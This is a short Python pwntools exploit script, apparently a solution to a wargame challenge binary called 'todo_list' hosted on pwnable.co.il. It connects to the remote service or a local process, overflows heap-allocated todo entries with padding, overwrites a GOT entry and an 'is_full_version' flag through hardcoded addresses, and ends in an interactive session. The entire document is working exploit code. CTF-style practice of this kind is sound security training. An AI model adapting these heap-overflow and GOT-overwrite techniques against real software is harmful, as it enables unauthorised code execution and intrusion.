from pwn import * 

context.binary = elf = ELF('./todo_list')
context.log_level = 'DEBUG'

if args['REMOTE']: 
    io = remote('pwnable.co.il', 9019)
else: 
    io = process([elf.path])
    gdb.attach(io)
    
is_full_version = 0x804c064
todos = 0x804d420
bss = 0x0804c060
heap = 0x804d000
heap_free_pointer = 0x804c049
new_heap_free_pointer = 0x804d000
puts_got = 0x804c01c
printf_got = 0x804c00c
free = 0x8049580
string_len_got = 0x804c028

def add_todo(number_of_chars, payload = b''): 
    global io 
    
    io.recvuntil(b'choice : ')
    io.sendline(b'1')
    io.recvuntil(b') : ')
    io.sendline(b'a' * number_of_chars + payload)
    
for _ in range(19): 
    add_todo(255)
add_todo(80 , payload= p32(string_len_got) + p32(is_full_version))

io.recvuntil(b'choice : ')
io.sendline(b'3')
io.recvuntil(b'number : ')
io.sendline(b'0')
io.sendline(p32(0x8049c18)) # ret ropper 0x0804900e


io.recvuntil(b'choice : ')
io.sendline(b'3')
io.recvuntil(b'number : ')
io.sendline(b'1')
io.sendline(p32(1))


io.interactive()